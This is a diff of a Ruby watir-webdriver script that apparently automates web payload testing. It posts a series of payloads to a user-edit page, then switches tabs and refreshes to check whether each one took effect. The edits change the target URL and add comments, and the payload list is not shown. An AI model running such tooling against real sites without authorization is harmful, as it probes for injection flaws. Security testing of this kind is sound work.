@@ -321,7 +321,7 @@ require 'watir-webdriver'
 require 'uri'
 
 # @url = URI.parse ARGV[0]
-@url = URI.parse "http://example.com/Pages/Users/User_Edit_General.aspx?userid=68&objectid=68"
+@url = URI.parse "http://example.com/Pages/Users/User_Edit.aspx?userid=68&objectid=68"
 
 @browser = Watir::Browser.new :firefox
 @browser.window.resize_to(800, 600)
@@ -372,10 +372,10 @@ puts "[*] Number of payloads: #{payloads.size} payloads"
 
 payloads.each do |payload|
   
-  @browser.send_keys(:alt, '1')
+  @browser.send_keys(:alt, '1')                                     # Send Alt+1 to go to first tab
   sendpost payload
   puts "[*] Sending to '#{@browser.title}' Payload : #{payload}"
-  @browser.send_keys(:alt, '2')
+  @browser.send_keys(:alt, '2')                                     # Send Alt+2 to go to second tab
   @browser.switch 
   @browser.refresh
   puts "[*] Checking Payload Resutl on #{@browser.title}"
